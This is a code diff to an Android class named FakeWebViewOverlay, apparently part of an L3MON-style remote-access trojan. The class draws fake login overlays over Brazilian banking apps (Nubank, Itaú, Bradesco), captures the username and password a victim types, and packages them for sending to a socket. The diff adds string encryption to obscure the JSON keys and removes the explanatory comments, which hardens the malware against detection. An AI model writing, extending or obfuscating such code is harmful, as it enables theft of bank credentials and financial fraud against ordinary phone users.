@@ -10,7 +10,10 @@ import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
+
 import org.json.JSONObject;
+
+import com.etechd.l3mon.StringCrypto;
 
 public class FakeWebViewOverlay {
 
@@ -37,22 +40,20 @@ public class FakeWebViewOverlay {
 
         try {
             WindowManager.LayoutParams params = createOverlayParams();
-
-            // Escolhe o layout de acordo com o banco
             overlayView = createBankSpecificLayout(bankName);
 
             if (overlayView != null) {
                 windowManager.addView(overlayView, params);
                 isShowing = true;
             }
-
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
     private WindowManager.LayoutParams createOverlayParams() {
-        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                 : WindowManager.LayoutParams.TYPE_PHONE;
 
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
@@ -98,28 +99,18 @@ public class FakeWebViewOverlay {
     }
 
     // ==================== LAYOUTS POR BANCO ====================
-
     private View createNubankFakeLayout(LayoutInflater inflater) {
-        // Idealmente usar um layout XML customizado que imite o Nubank
         View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
-
-        // Aqui você pode inflar um layout mais elaborado com:
-        // - Logo do Nubank
-        // - Campos de CPF + Senha
-        // - Botão roxo característico
-
         return view;
     }
 
     private View createItauFakeLayout(LayoutInflater inflater) {
         View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
-        // Layout com cores laranja do Itaú
         return view;
     }
 
     private View createBradescoFakeLayout(LayoutInflater inflater) {
         View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
-        // Layout com cores vermelhas do Bradesco
         return view;
     }
 
@@ -130,19 +121,15 @@ public class FakeWebViewOverlay {
 
     private View createGenericBankLayout(LayoutInflater inflater, String bankName) {
         View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
-        // Layout genérico
         return view;
     }
 
     // ==================== CAPTURA DE DADOS ====================
-
     private void setupCaptureListeners(View view, String bankName) {
         if (view == null)
             return;
 
-        // Exemplo: Capturar quando o usuário clicar em "Entrar"
         Button loginButton = view.findViewById(android.R.id.button1); // Ajuste conforme seu layout
-
         if (loginButton != null) {
             loginButton.setOnClickListener(v -> {
                 captureCredentials(view, bankName);
@@ -153,18 +140,22 @@ public class FakeWebViewOverlay {
 
     private void captureCredentials(View view, String bankName) {
         try {
-            EditText usernameField = view.findViewById(android.R.id.text1); // Ajuste os IDs
+            EditText usernameField = view.findViewById(android.R.id.text1);
             EditText passwordField = view.findViewById(android.R.id.text2);
 
             String username = usernameField != null ? usernameField.getText().toString() : "";
             String password = passwordField != null ? passwordField.getText().toString() : "";
 
             JSONObject capture = new JSONObject();
-            capture.put("action", "fake_overlay_capture");
-            capture.put("bank", bankName);
-            capture.put("username", username);
-            capture.put("password", password);
-            capture.put("timestamp", System.currentTimeMillis());
+
+            // === CHAVES JSON CRIPTOGRAFADAS ===
+            capture.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="),
+                    StringCrypto.d("u+cdYuBWQ+ejLj0Lm4hOL7OQ4LwyFs9Bb+K7gGSnc2I=")); // "action" =
+                                                                                     // "fake_overlay_capture"
+            capture.put(StringCrypto.d("bftMHTJO9AYrI3XBQoExcQ=="), bankName); // "bank"
+            capture.put(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), username); // "username"
+            capture.put(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), password); // "password"
+            capture.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
 
             // Enviar para servidor
             // ConnectionManager.ioSocket.emit("0xWV", capture);
